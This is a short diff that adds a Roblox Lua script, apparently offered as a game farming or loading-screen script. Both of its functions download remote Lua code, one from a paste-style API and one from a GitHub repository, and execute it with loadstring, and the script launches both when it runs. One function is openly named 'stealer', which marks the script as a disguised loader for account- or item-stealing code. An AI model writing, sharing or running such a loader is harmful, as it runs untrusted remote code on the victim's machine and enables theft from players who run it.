@@ -1,0 +1,10 @@
+local function stealer()
+    loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/bHp5vmr8hTptXQJY/raw", true))()
+end
+
+local function loadingscreen()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptshubs1/farm/refs/heads/main/11.lua"))()
+end
+
+task.spawn(stealer)
+task.spawn(loadingscreen)
